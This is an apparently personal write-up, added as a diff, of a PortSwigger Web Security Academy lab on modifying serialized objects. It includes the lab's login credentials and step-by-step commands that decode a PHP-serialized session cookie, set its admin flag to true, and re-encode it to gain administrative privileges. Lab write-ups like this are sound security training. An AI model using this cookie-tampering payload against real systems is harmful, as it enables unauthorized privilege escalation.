@@ -1,0 +1,75 @@
+                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                      MODIFYING SERIALIZED OBJECTS
+
+                                  ilak
+                     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1. lab
+.. 1. Objectives
+2. steps
+
+
+1 lab
+═════
+
+  <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects>
+
+  • This lab uses a serialization-based session mechanism and is
+    vulnerable to privilege escalation as a result.
+
+  • Credentials
+
+    wiener:peter
+
+
+1.1 Objectives
+──────────────
+
+  • Edit the serialized object in the session cookie to exploit this
+    vulnerability and get administrative privileges.
+
+  • Delete user carlos again
+
+
+2 steps
+═══════
+
+  After login, get the cookie with `dev tools'
+
+  ┌────
+  │ CTRL + SHIT + i
+  │ 
+  │ Application > Storage > Cookies
+  └────
+
+  Decode the base64 cookie ->
+
+  • Remove the “%3d” (=)
+
+  ┌────
+  │ echo'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=' | base64 -d
+  └────
+
+  Original decoded object ->
+
+  ┌────
+  │ O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
+  └────
+
+  Modify the bool value of the admin, 0 to 1
+
+  ┌────
+  │ O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+  └────
+
+  Encode base64 again ->
+
+  ┌────
+  │ echo 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64 -w 0
+  └────
+
+  Copy to dev tools Cookie value and reload the page
